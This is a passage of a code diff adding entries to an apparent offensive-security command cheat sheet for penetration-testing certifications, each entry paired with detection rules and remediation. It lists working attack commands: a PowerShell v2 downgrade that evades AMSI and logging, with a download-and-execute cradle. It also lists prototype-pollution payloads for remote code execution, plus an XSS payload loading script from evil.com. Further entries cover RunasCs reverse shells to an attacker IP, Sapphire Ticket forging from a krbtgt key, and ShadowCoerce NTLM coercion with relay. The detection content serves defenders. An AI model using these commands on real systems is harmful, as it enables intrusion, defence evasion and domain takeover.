+      "description": "Forcing PowerShell v2 bypasses Script Block Logging, Module Logging, Transcription, and AMSI - all protections added in v3+. If .NET 2.0/3.5 is installed (common on older servers), PowerShell v2 engine is available even on modern Windows. The simplest evasion technique that still works.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Evasion",
+      "certifications": [
+        "CRTP",
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP evasion module; common red team technique",
+      "tags": [
+        "powershell",
+        "downgrade",
+        "evasion",
+        "amsi-bypass",
+        "logging-bypass",
+        "v2"
+      ],
+      "mitre": [
+        "T1059.001",
+        "T1562.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nPowerShell v2 has NONE of the modern security features:\n- No Script Block Logging (Event 4104)\n- No Module Logging\n- No Transcription\n- No AMSI (Antimalware Scan Interface)\n- No Constrained Language Mode enforcement\n\n=== USAGE ===\n  powershell -version 2\n  # Check version: $PSVersionTable.PSVersion\n  # Should show Major: 2\n\n=== DETECTION ===\n  # Check if v2 engine is installed:\n  Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2\n  # Requires .NET 2.0/3.5\n\n=== FROM CMD ===\n  powershell.exe -Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')\"\n\n=== LIMITATIONS ===\n- Requires .NET Framework 2.0/3.5 installed\n- Process creation still logged (Event 4688 / Sysmon 1)\n- The -Version 2 argument itself is detectable in command line\n- Some modern cmdlets not available in v2\n\n=== REMEDIATION ===\n  # Remove PowerShell v2 engine:\n  Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root\n  # Remove .NET 2.0/3.5 if not needed",
+      "examples": [
+        {
+          "label": "Launch PowerShell v2",
+          "command": "powershell -version 2"
+        },
+        {
+          "label": "Run script via v2 from cmd",
+          "command": "powershell.exe -Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')\""
+        },
+        {
+          "label": "Check if v2 engine is available",
+          "command": "Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1059.001 - PowerShell",
+          "url": "https://attack.mitre.org/techniques/T1059/001/"
+        },
+        {
+          "title": "PowerShell Downgrade Attacks",
+          "url": "https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "PowerShell v2 predates all modern security controls. By explicitly requesting the v2 engine, attackers bypass AMSI, script block logging, and CLM.",
+        "prerequisites": ".NET Framework 2.0/3.5 and PowerShell v2 engine installed on target.",
+        "impact": "Complete bypass of PowerShell security logging and AMSI scanning.",
+        "detection": "[MITRE T1059.001] Process creation with '-version 2' or '-v 2' argument; Event 400 with EngineVersion=2; Sysmon Event 1.",
+        "artifacts": "Process creation logs with PowerShell v2 arguments; Event 400/403 with v2 engine version.",
+        "splunk_spl": "index=sysmon EventCode=1 Image=\"*powershell*\" CommandLine=\"*-version 2*\" OR CommandLine=\"*-v 2*\"\n| table _time, User, CommandLine, ParentCommandLine",
+        "elastic_kql": "process.name:\"powershell.exe\" AND process.command_line:(*-version?2* OR *-v?2*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4688\n| where NewProcessName endswith \"powershell.exe\"\n| where CommandLine contains \"-version 2\" or CommandLine contains \"-v 2\"\n| project TimeGenerated, Account, CommandLine",
+        "sigma_rules": "proc_creation_win_powershell_downgrade",
+        "prevention": "Remove PowerShell v2 engine: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root; remove .NET 2.0/3.5 if not needed.",
+        "sources": [
+          "CRTP evasion module",
+          "https://attack.mitre.org/techniques/T1059/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "PowerShell Downgrade to v2",
+            "logic": "title: PowerShell Downgrade Attack\nstatus: stable\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - '-version 2'\n      - '-v 2'\n  condition: selection\nlevel: high",
+            "data_source": "sysmon",
+            "log_ids": [
+              "1"
+            ],
+            "attack": [
+              "T1059.001",
+              "T1562.001"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legacy scripts requiring PowerShell v2",
+            "tuning": "Correlate with subsequent suspicious PowerShell activity"
+          }
+        ]
+      }
     },
     {
       "id": "powershell-shellcode-runner",
@@ -118199,6 +119330,92 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Encrypts a file with AES-256 before moving it, so an intercepted transfer is useless without the key:\n  openssl enc -aes256   symmetric AES-256 encryption\n  -iter 100000 -pbkdf2  derive the key from your passphrase with 100000 PBKDF2 rounds\n  -in <file>            plaintext input\n  -out <file>.enc       ciphertext output\nProduces an encrypted blob to transfer; reverse with -d to decrypt (Invoke-AESEncryption is the Windows equivalent)."
+    },
+    {
+      "id": "web-prototype-pollution",
+      "name": "Prototype Pollution - JavaScript Object Injection",
+      "command": "curl -X POST http://<target>/api -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'",
+      "description": "Prototype Pollution injects properties into JavaScript Object.prototype via __proto__, constructor.prototype, or constructor paths. In Node.js/Express apps, this can bypass authorization checks, poison template engines for RCE, or manipulate application logic. A client-side variant enables XSS through DOM clobbering.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Injection",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "Modern web exploitation research; HackTricks",
+      "tags": [
+        "prototype-pollution",
+        "javascript",
+        "nodejs",
+        "injection",
+        "rce",
+        "xss",
+        "object-injection"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nJavaScript objects inherit from Object.prototype. If you can set\nproperties on __proto__, EVERY object in the application inherits\nthose properties. This breaks authorization, poisons templates, etc.\n\n=== DETECTION ===\n  # Send __proto__ in JSON body\n  curl -X POST http://<target>/api -H 'Content-Type: application/json' \\\n    -d '{\"__proto__\":{\"test\":\"polluted\"}}'\n  # Check if pollution worked - look for 'test' in responses\n\n  # Alternative paths:\n  {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}\n  {\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id')//\"}}\n\n=== AUTH BYPASS ===\n  # If app checks obj.isAdmin\n  {\"__proto__\":{\"isAdmin\":true}}\n  {\"__proto__\":{\"role\":\"admin\"}}\n  {\"__proto__\":{\"verified\":true}}\n\n=== RCE VIA TEMPLATE ENGINES ===\n  # EJS (outputFunctionName gadget)\n  {\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id')//\"}}\n\n  # Pug/Jade\n  {\"__proto__\":{\"block\":{\"type\":\"Text\",\"val\":\"x]');process.mainModule.require('child_process').execSync('id')//\"}}}\n\n  # Handlebars\n  {\"__proto__\":{\"pendingContent\":\"<script>alert(1)</script>\"}}\n\n=== CLIENT-SIDE (XSS) ===\n  # URL-based pollution\n  https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>\n  https://target.com/?constructor[prototype][src]=//evil.com/xss.js\n\n=== TOOLS ===\n  # Server-side fuzzing\n  ppfuzz scan -u http://<target>/api -m POST\n  # Client-side detection\n  # Browser console: Object.prototype.pptest = 'polluted'; check app behavior",
+      "examples": [
+        {
+          "label": "Basic auth bypass via __proto__",
+          "command": "curl -X POST http://<target>/api -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'"
+        },
+        {
+          "label": "RCE via EJS template engine",
+          "command": "curl -X POST http://<target>/api -H 'Content-Type: application/json' -d '{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")//\"}}'"
+        },
+        {
+          "label": "Constructor.prototype path",
+          "command": "curl -X POST http://<target>/api -H 'Content-Type: application/json' -d '{\"constructor\":{\"prototype\":{\"role\":\"admin\"}}}'"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Prototype Pollution",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/"
+        },
+        {
+          "title": "Prototype Pollution to RCE",
+          "url": "https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "JavaScript's prototype chain means setting properties on Object.prototype affects all objects. Merge/extend functions that recursively copy user input without filtering __proto__ enable the attack.",
+        "prerequisites": "Node.js/Express app with recursive merge/extend on user-controlled JSON; or client-side with URL parameter parsing.",
+        "impact": "Authorization bypass, RCE via template engine gadgets, XSS via DOM clobbering, DoS via type confusion.",
+        "detection": "[MITRE T1190] __proto__ or constructor.prototype in request bodies/parameters; unusual object properties in application state.",
+        "artifacts": "HTTP request logs with __proto__ in body; application errors from unexpected property types.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| where match(request_body, \"__proto__|constructor.*prototype\")\n| table _time, src_ip, uri_path, request_body",
+        "elastic_kql": "http.request.body.content:(*__proto__* OR *constructor.prototype*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery contains \"__proto__\" or csUriQuery contains \"constructor\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery",
+        "sigma_rules": "web_prototype_pollution_attempt",
+        "prevention": "Use Object.create(null) for dictionaries; freeze Object.prototype; validate/sanitize recursive merge inputs; use Map instead of plain objects.",
+        "sources": [
+          "https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Prototype Pollution attempt in HTTP request",
+            "logic": "title: Prototype Pollution Attempt\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-query|contains:\n      - '__proto__'\n      - 'constructor.prototype'\n  condition: selection\nlevel: high",
+            "data_source": "iis",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "JavaScript debugging tools sending __proto__ in requests",
+            "tuning": "Correlate with server-side errors or auth state changes"
+          }
+        ]
+      }
     },
     {
       "id": "proxychains-run",
@@ -128344,6 +129561,284 @@ const COMMAND_DATA = {
       "explain": "Spawns a process carrying AD credentials for network auth, even off a non-domain-joined host:\n  runas /netonly           the injected creds are used only for outbound network authentication, not local logon\n  /user:<domain>\\<user>    the account to authenticate as\n  powershell               the process to launch with those creds\nYou will be prompted for the password. Run domain tools (PowerView, etc.) in that window and they authenticate to the DC as <user>."
     },
     {
+      "id": "privesc-runascs",
+      "name": "RunasCs - Windows Runas Alternative with Full Credential Support",
+      "command": "RunasCs.exe <user> <password> cmd.exe",
+      "description": "RunasCs is a runas alternative that supports plaintext credentials, NTLM hashes, Kerberos tickets, and various logon types. Unlike built-in runas, it works via non-interactive sessions (reverse shells, webshells), supports network logon (type 9), and can create processes with different credential combinations.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Windows - Miscellaneous Techniques",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "antonioCoco/RunasCs; modern Windows privesc",
+      "tags": [
+        "runascs",
+        "runas",
+        "credential-usage",
+        "lateral-movement",
+        "logon-type",
+        "windows"
+      ],
+      "mitre": [
+        "T1134.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC USAGE ===\n  RunasCs.exe <user> <password> cmd.exe\n  RunasCs.exe administrator P@ssword123 \"cmd.exe /c whoami\"\n\n=== REVERSE SHELL ===\n  RunasCs.exe user pass cmd.exe -r <attacker_ip>:<port>\n  # Runs cmd.exe as 'user' and sends output to attacker\n\n=== LOGON TYPES ===\n  RunasCs.exe user pass cmd.exe -l 2    # Interactive logon (default)\n  RunasCs.exe user pass cmd.exe -l 9    # NewCredentials (like runas /netonly)\n  RunasCs.exe user pass cmd.exe -l 3    # Network logon\n  # Type 9 is most useful: local commands run as current user,\n  # network commands (SMB, LDAP, etc.) use the new credentials\n\n=== BYPASS UAC ===\n  RunasCs.exe admin pass cmd.exe --bypass-uac\n  # Starts elevated process without UAC prompt\n\n=== CREATE PROCESS ===\n  RunasCs.exe user pass powershell.exe -t 0\n  # -t 0 = create process in session 0 (service context)\n\n=== WHY NOT JUST RUNAS? ===\n- runas requires an interactive console (fails in shells)\n- runas can't do network-only logon (type 9) easily\n- runas can't bypass UAC\n- RunasCs works from webshells, reverse shells, WinRM, etc.\n\n=== CHAIN ===\n  # Found creds in config file? Spawn shell as that user:\n  RunasCs.exe svc_account DbP@ss123 cmd.exe -r 10.10.14.5:9001\n  # Or use for lateral movement:\n  RunasCs.exe admin Pass123 \"cmd.exe /c dir \\\\target\\C$\" -l 9",
+      "examples": [
+        {
+          "label": "Run command as different user",
+          "command": "RunasCs.exe administrator P@ssword123 cmd.exe"
+        },
+        {
+          "label": "Reverse shell as another user",
+          "command": "RunasCs.exe svc_account Pass123 cmd.exe -r 10.10.14.5:9001"
+        },
+        {
+          "label": "Network-only logon (runas /netonly)",
+          "command": "RunasCs.exe domain_user Pass123 powershell.exe -l 9"
+        }
+      ],
+      "references": [
+        {
+          "title": "RunasCs - GitHub",
+          "url": "https://github.com/antonioCoco/RunasCs"
+        },
+        {
+          "title": "MITRE T1134 - Access Token Manipulation",
+          "url": "https://attack.mitre.org/techniques/T1134/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "RunasCs uses Windows APIs (CreateProcessWithLogonW, LogonUser) to create processes with alternate credentials, supporting logon types that the built-in runas command doesn't expose.",
+        "prerequisites": "Valid credentials for the target user; RunasCs binary on the target.",
+        "impact": "Privilege escalation or lateral movement using discovered credentials.",
+        "detection": "[MITRE T1134.002] Unusual process creation with LogonType 9; RunasCs.exe in process logs; credential use from unexpected sources.",
+        "artifacts": "Event 4624 (logon) with specific logon types; process creation logs; RunasCs binary on disk.",
+        "splunk_spl": "index=wineventlog EventCode=4688 NewProcessName=\"*RunasCs*\"\n| table _time, SubjectUserName, NewProcessName, CommandLine, TargetUserName",
+        "elastic_kql": "process.name:\"RunasCs.exe\" OR process.command_line:*RunasCs*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4688 and (NewProcessName contains \"RunasCs\" or CommandLine contains \"RunasCs\")\n| project TimeGenerated, SubjectUserName, NewProcessName, CommandLine",
+        "sigma_rules": "proc_creation_win_runascs",
+        "prevention": "Block unauthorized binaries via AppLocker/WDAC; monitor for unusual logon types; restrict credential storage.",
+        "sources": [
+          "https://github.com/antonioCoco/RunasCs",
+          "https://attack.mitre.org/techniques/T1134/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "RunasCs execution detection",
+            "logic": "title: RunasCs Execution\nstatus: experimental\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\RunasCs.exe'\n  selection2:\n    CommandLine|contains: 'RunasCs'\n  condition: selection or selection2\nlevel: high",
+            "data_source": "sysmon",
+            "log_ids": [
+              "1"
+            ],
+            "attack": [
+              "T1134.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate admin use of RunasCs for service management",
+            "tuning": "Correlate with logon events (4624) and parent process"
+          }
+        ]
+      }
+    },
+    {
+      "id": "recon-rustscan",
+      "name": "RustScan - Ultra-Fast Port Scanner + Nmap Integration",
+      "command": "rustscan -a <target> -- -sC -sV",
+      "description": "RustScan scans all 65535 ports in seconds using async I/O, then automatically pipes discovered open ports into nmap for service detection and scripts. Replaces the slow nmap full-port scan step. Use it as the first recon tool to find all open ports fast, then let nmap do the deep dive.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Enumeration",
+      "subcategory": "Service Scanning",
+      "certifications": [
+        "OSCP",
+        "CPTS",
+        "CWES"
+      ],
+      "primary_cert": "CPTS",
+      "source": "RustScan project; CWES bug bounty methodology",
+      "tags": [
+        "rustscan",
+        "port-scanning",
+        "nmap",
+        "fast-scan",
+        "reconnaissance",
+        "async"
+      ],
+      "mitre": [
+        "T1046"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC SCAN ===\n  rustscan -a <target> -- -sC -sV\n  # Scans all 65535 ports, passes open ones to nmap with -sC -sV\n\n=== SPEED CONTROL ===\n  rustscan -a <target> -b 1000 -- -sC -sV\n  # -b batch size (default 4500, lower = quieter)\n  rustscan -a <target> -t 2000 -- -sC -sV\n  # -t timeout in ms\n\n=== MULTIPLE TARGETS ===\n  rustscan -a 192.168.1.1,192.168.1.2,192.168.1.3 -- -sC -sV\n  rustscan -a 192.168.1.0/24 -- -sC -sV\n\n=== SPECIFIC PORTS ===\n  rustscan -a <target> -p 80,443,8080 -- -sC -sV\n  rustscan -a <target> -r 1-1000 -- -sC -sV\n\n=== OUTPUT ===\n  rustscan -a <target> -- -sC -sV -oA scan_results\n  # Everything after -- goes to nmap\n\n=== WORKFLOW ===\n  1. rustscan -a <target> -- -sC -sV -oA initial\n  2. Review results, identify interesting services\n  3. Deep nmap NSE scripts on specific ports\n  4. Start service-specific enumeration\n\n=== INSTALL ===\n  cargo install rustscan\n  # or: docker pull rustscan/rustscan",
+      "examples": [
+        {
+          "label": "Full port scan with nmap service detection",
+          "command": "rustscan -a 10.10.10.5 -- -sC -sV -oA scan"
+        },
+        {
+          "label": "Rate-limited scan",
+          "command": "rustscan -a 10.10.10.5 -b 500 -- -sC -sV"
+        },
+        {
+          "label": "Scan subnet",
+          "command": "rustscan -a 192.168.1.0/24 -- -sC -sV"
+        }
+      ],
+      "references": [
+        {
+          "title": "RustScan - GitHub",
+          "url": "https://github.com/RustScan/RustScan"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "nmap-syntax",
+          "note": "nmap for deep service enumeration after RustScan finds open ports.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Async I/O allows scanning all ports in parallel, dramatically faster than nmap's default sequential approach.",
+        "prerequisites": "Network access to target; rustscan installed.",
+        "impact": "Rapid port discovery enables faster enumeration of attack surface.",
+        "detection": "[MITRE T1046] High-rate SYN packets from single source; IDS/firewall alerts for port scanning.",
+        "artifacts": "Firewall logs showing rapid connection attempts across many ports; IDS alerts.",
+        "splunk_spl": "index=network sourcetype=firewall action=denied\n| stats dc(dest_port) as ports_scanned by src_ip\n| where ports_scanned > 1000\n| sort -ports_scanned",
+        "elastic_kql": "event.action:\"denied\" AND event.category:\"network\"",
+        "sentinel_kql": "CommonSecurityLog\n| where DeviceAction == \"Deny\"\n| summarize PortCount=dcount(DestinationPort) by SourceIP\n| where PortCount > 1000",
+        "sigma_rules": "net_port_scan_rapid",
+        "prevention": "Rate limiting on firewalls; IDS/IPS signatures for port scanning; network segmentation.",
+        "sources": [
+          "https://github.com/RustScan/RustScan",
+          "https://attack.mitre.org/techniques/T1046/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Rapid port scan detection",
+            "logic": "title: High-Rate Port Scanning\nstatus: experimental\nlogsource:\n  category: firewall\ndetection:\n  selection:\n    action: deny\n  condition: selection | count(dst_port) by src_ip > 1000\nlevel: high",
+            "data_source": "firewall",
+            "attack": [
+              "T1046"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate vulnerability scanners",
+            "tuning": "Whitelist known scanner IPs; adjust threshold based on environment"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-sapphire-ticket",
+      "name": "Sapphire Ticket - Hybrid Diamond Ticket with S4U2Self",
+      "command": "Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:<dc_ip> /ticketuserid:500 /groups:512",
+      "description": "Sapphire Tickets combine Diamond Ticket technique with S4U2Self to create tickets that are indistinguishable from legitimate ones. Instead of modifying a TGT's PAC directly, it uses S4U2Self to get a legitimate PAC for the target user, then embeds it in a forged ticket. Harder to detect than Golden/Silver tickets because the PAC is a real PAC from the DC.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Charlie Clark (Semperis) research; Rubeus diamond ticket mode",
+      "tags": [
+        "sapphire-ticket",
+        "diamond-ticket",
+        "kerberos",
+        "persistence",
+        "krbtgt",
+        "s4u2self",
+        "forged-ticket"
+      ],
+      "mitre": [
+        "T1558.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nGolden Ticket: fully forged TGT with fabricated PAC\nDiamond Ticket: request real TGT, decrypt with krbtgt key, modify PAC\nSapphire Ticket: like Diamond, but uses S4U2Self for a real PAC\n\nThe Sapphire Ticket's PAC is legitimate (obtained via S4U2Self),\nmaking it pass PAC validation checks that catch Golden Tickets.\n\n=== PREREQUISITES ===\n- krbtgt AES256 key (from DCSync or NTDS.dit)\n- Domain SID\n\n=== CREATE SAPPHIRE TICKET ===\n  # Rubeus diamond with /tgtdeleg requests a real TGT first\n  Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:<dc_ip> /ticketuserid:500 /groups:512\n\n  # The /tgtdeleg flag makes Rubeus use S4U2Self to get a real PAC\n  # The result is a TGT that passes all PAC validation\n\n=== USING THE TICKET ===\n  Rubeus.exe ptt /ticket:<base64_ticket>\n  # Or save to file and use with other tools\n  Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:corp.local /username:administrator /password:fake /ticket:<base64>\n\n=== DETECTION DIFFICULTY ===\n- PAC is legitimate (S4U2Self from DC)\n- Encryption matches krbtgt key\n- TGT structure is valid\n- Only detectable via anomalous TGT requests or krbtgt key compromise indicators\n\n=== COMPARISON ===\n  Golden Ticket:   fabricated PAC, easier to detect via PAC validation\n  Silver Ticket:   service-specific, no DC contact, limited scope\n  Diamond Ticket:  modified PAC on real TGT, detectable via PAC mismatch\n  Sapphire Ticket: real PAC via S4U2Self, hardest to detect",
+      "examples": [
+        {
+          "label": "Create Sapphire Ticket",
+          "command": "Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:dc01.corp.local /ticketuserid:500 /groups:512"
+        },
+        {
+          "label": "Inject ticket into session",
+          "command": "Rubeus.exe ptt /ticket:<base64_ticket>"
+        },
+        {
+          "label": "Create process with ticket",
+          "command": "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /ticket:<base64>"
+        }
+      ],
+      "references": [
+        {
+          "title": "Diamond and Sapphire Tickets - Semperis",
+          "url": "https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/"
+        },
+        {
+          "title": "Rubeus Wiki - Diamond Tickets",
+          "url": "https://github.com/GhostPack/Rubeus"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-golden-ticket",
+          "note": "Golden Ticket is the original forged TGT; Sapphire is the evasive evolution.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-secretsdump-dcsync",
+          "note": "DCSync provides the krbtgt key needed for Sapphire Tickets.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "By using S4U2Self to obtain a real PAC from the DC, the Sapphire Ticket bypasses PAC validation checks that catch Golden and Diamond Tickets. The PAC is legitimate, just embedded in an attacker-controlled TGT.",
+        "prerequisites": "krbtgt AES256 key (requires prior domain compromise via DCSync or NTDS.dit extraction).",
+        "impact": "Persistent domain admin access via undetectable forged Kerberos tickets.",
+        "detection": "[MITRE T1558.001] Anomalous S4U2Self requests followed by TGT usage; TGT requests that bypass normal AS-REQ flow; krbtgt key rotation indicators.",
+        "artifacts": "S4U2Self requests for high-privilege accounts; TGTs with unusual lifetimes or request patterns.",
+        "splunk_spl": "index=wineventlog EventCode=4769 ServiceName=\"krbtgt\" TicketEncryptionType=0x12\n| where TicketOptions LIKE \"%forwardable%\"\n| stats count by ServiceName, TargetUserName, IpAddress\n| where count > 5",
+        "elastic_kql": "event.code:\"4769\" AND winlog.event_data.ServiceName:\"krbtgt\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| where ServiceName == \"krbtgt\"\n| project TimeGenerated, TargetUserName, IpAddress, TicketEncryptionType",
+        "sigma_rules": "win_kerberos_sapphire_diamond_ticket",
+        "prevention": "Rotate krbtgt password twice (invalidates all tickets); monitor for DCSync; use ATA/MDI for anomalous Kerberos detection; enable PAC validation.",
+        "sources": [
+          "https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/",
+          "https://attack.mitre.org/techniques/T1558/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Sapphire/Diamond Ticket - Anomalous S4U2Self",
+            "logic": "SecurityEvent\n| where EventID == 4769\n| where ServiceName == \"krbtgt\" and TicketEncryptionType == \"0x12\"\n| summarize RequestCount=count() by TargetUserName, IpAddress, bin(TimeGenerated, 1h)\n| where RequestCount > 3",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4769"
+            ],
+            "attack": [
+              "T1558.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate Kerberos renewals and delegation",
+            "tuning": "Correlate with DCSync detection (Event 4662 with replication rights)"
+          }
+        ]
+      }
+    },
+    {
       "type": "reference",
       "platform": "linux",
       "requires": [
@@ -131964,6 +133459,105 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "certipy-ad shadow auto automates the whole Shadow Credentials attack:\n  -u <user>@<domain> -p <password>  authenticate as the account you already control\n  -account <target_account>         the victim whose msDS-KeyCredentialLink you write to\n  -dc-ip <dc_ip>                    the Domain Controller to talk to\n'shadow auto' adds a key credential, authenticates via PKINIT, UnPACs the NT hash, then removes the key it added (cleanup)."
+    },
+    {
+      "id": "ad-shadowcoerce",
+      "name": "ShadowCoerce - NTLM Authentication Coercion via MS-FSRVP",
+      "command": "python3 shadowcoerce.py -d <domain> -u <user> -p <password> <listener_ip> <dc_ip>",
+      "description": "ShadowCoerce abuses the MS-FSRVP (File Server VSS Agent Service) protocol to coerce NTLM authentication from a target machine. Similar to PetitPotam but uses a different RPC interface. Feed the coerced auth into ntlmrelayx for RBCD, Shadow Credentials, or ADCS relay.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "ShutdownRepo/ShadowCoerce; coercion research",
+      "tags": [
+        "shadowcoerce",
+        "ms-fsrvp",
+        "ntlm-coercion",
+        "relay",
+        "authentication-coercion"
+      ],
+      "mitre": [
+        "T1187"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nMS-FSRVP (File Server VSS Agent Service) can be abused to\nmake a target machine authenticate to an attacker-controlled\nhost. Like PetitPotam, but uses a different RPC pipe.\n\n=== USAGE ===\n  python3 shadowcoerce.py -d corp.local -u user -p pass <listener_ip> <dc_ip>\n\n=== CHAIN WITH NTLMRELAYX ===\n  # Terminal 1: Start relay\n  ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --escalate-user attacker$\n  # Terminal 2: Coerce\n  python3 shadowcoerce.py -d corp.local -u user -p pass <attacker_ip> <target_ip>\n\n=== ALTERNATIVES (if MS-FSRVP is disabled) ===\n  # PetitPotam (MS-EFSR)\n  python3 PetitPotam.py <listener_ip> <dc_ip>\n  # PrinterBug (MS-RPRN)\n  python3 printerbug.py corp.local/user:pass@<dc_ip> <listener_ip>\n  # DFSCoerce (MS-DFSNM)\n  python3 dfscoerce.py -d corp.local -u user -p pass <listener_ip> <dc_ip>\n  # Coercer (tries all methods)\n  coercer coerce -l <listener_ip> -t <dc_ip> -u user -p pass",
+      "examples": [
+        {
+          "label": "Coerce NTLM auth via MS-FSRVP",
+          "command": "python3 shadowcoerce.py -d corp.local -u user -p pass 10.10.14.5 192.168.1.10"
+        },
+        {
+          "label": "Chain with ntlmrelayx for RBCD",
+          "command": "ntlmrelayx.py -t ldaps://192.168.1.10 --delegate-access"
+        },
+        {
+          "label": "Coercer multi-method",
+          "command": "coercer coerce -l 10.10.14.5 -t 192.168.1.10 -u user -p pass -d corp.local"
+        }
+      ],
+      "references": [
+        {
+          "title": "ShadowCoerce - GitHub",
+          "url": "https://github.com/ShutdownRepo/ShadowCoerce"
+        },
+        {
+          "title": "Coercer - Multi-method",
+          "url": "https://github.com/p0dalirius/Coercer"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-petitpotam",
+          "note": "PetitPotam uses MS-EFSR for the same coercion attack.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-printerbug-enum",
+          "note": "PrinterBug uses MS-RPRN for coercion.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "MS-FSRVP is a Windows RPC service that can be invoked remotely. The IsPathSupported call forces the target to authenticate back to the caller, leaking the machine NTLM hash.",
+        "prerequisites": "Valid domain credentials; MS-FSRVP service running on target.",
+        "impact": "Coerced machine account NTLM hash for relay attacks leading to RBCD, Shadow Credentials, or ADCS abuse.",
+        "detection": "[MITRE T1187] RPC calls to MS-FSRVP from unusual sources; NTLM authentication to unexpected hosts.",
+        "artifacts": "Network traffic on FssagentRpc named pipe; NTLM authentication to non-DC hosts.",
